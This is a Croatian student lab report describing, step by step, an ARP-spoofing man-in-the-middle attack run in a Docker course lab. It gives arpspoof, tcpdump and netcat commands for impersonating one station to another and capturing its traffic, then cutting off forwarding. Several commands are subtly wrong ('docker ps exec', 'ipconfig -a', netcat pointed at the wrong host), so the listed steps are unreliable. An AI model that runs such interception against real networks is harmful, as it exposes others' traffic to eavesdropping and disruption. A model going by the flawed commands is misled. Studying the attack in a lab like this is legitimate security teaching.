# Izvještaj za 1. labaratorijske vježbe

Created: October 20, 2021 12:13 PM
Last Edited Time: October 20, 2021 12:50 PM

## **Zadatak**

Izvršiti man in the middle napad u virtualnoj Docker mreži.

## Korišteni kod

Kloniranje repozitorija sa GitHuba

`$ git clone [https://github.com/mcagalj/SRP-2021-22](https://github.com/mcagalj/SRP-2021-22)`

Pokretanje docker containera

`$ ./start.sh`

Zaustavljanje docker containera

`$ ./stop.sh`

Pokretanje interaktivnog shella u station-1

`$ docker ps exec -it sh`

Dohvaćanje podataka o mrežnom interfaceu

`$ ipconfig -a`

*Dobivamo podatke (primarno IP i Ethernet adresu koja će nam biti korisna dalje)*

Pingamo station-2 kako bi saznali nalazi li se na istoj mreži

`$ ping station-2`

Pokretanje interaktivnog shella u station-2

`$ docker ps exec -it station-2 sh`

U station-1 pomoću netcata otvaramo TCP scoket na portu 9000

`$ netcat -l -p 9000`

U station-2 pomocu netcata otvaramo client TCP socket na hostnameu station-1 9000

`$ netcat station-2 9000`

Pokretanje interaktivnog shella u evil-station

`$ docker ps exec -it evil-station sh`

U evil-station pokrećemo arpspoof

`$ arpspoof -t station-1 station-2`

*Stationu-1 se predstavljamo kao station-2 povezivanjem ethernet adrese evil-stationa sa IP adresom station-2*

Pokrećemo tcpdump u evil-stationu, te filtriramo promet

`$ tcpdump -X host station-1 and not arp`

Zaustavljamo prosljeđivanje presretanog prometa stationu-2

`$ echo 0 > /proc/sys/net/ipv4/ip_forward`

## Zaključak

Iskorištavanjem mana ARP protokola, možemo narušiti svaki segment CIA zahtjeva.